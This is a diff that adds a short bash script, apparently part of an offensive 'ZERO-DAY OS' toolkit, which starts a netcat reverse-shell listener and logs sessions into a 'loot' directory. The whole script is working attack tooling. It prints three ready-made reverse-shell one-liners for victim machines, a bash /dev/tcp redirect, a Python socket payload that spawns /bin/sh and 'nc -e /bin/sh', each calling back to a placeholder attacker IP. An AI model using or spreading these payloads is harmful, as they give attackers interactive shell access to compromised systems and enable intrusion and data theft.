@@ -1,0 +1,27 @@
+#!/bin/bash
+# /usr/local/bin/revshell-listen
+# Netcat reverse shell listener with session logging
+# Usage: revshell-listen [port]
+
+PORT="${1:-4444}"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+mkdir -p "$LOOT"
+LOGFILE="$LOOT/revshell_${PORT}_${TIMESTAMP}.log"
+
+echo "[*] ZERO-DAY OS — Reverse Shell Listener"
+echo "[*] Listening on port $PORT"
+echo "[*] Session log: $LOGFILE"
+echo ""
+echo "[*] Connect from target with:"
+echo "    bash -i >& /dev/tcp/<YOUR_IP>/$PORT 0>&1"
+echo "    python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<YOUR_IP>\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+echo "    nc <YOUR_IP> $PORT -e /bin/sh"
+echo ""
+
+echo "[*] Starting listener on port $PORT..."
+nc -l -p "$PORT" -v 2>&1 | tee "$LOGFILE"
+
+echo ""
+echo "[+] Session ended. Log: $LOGFILE"
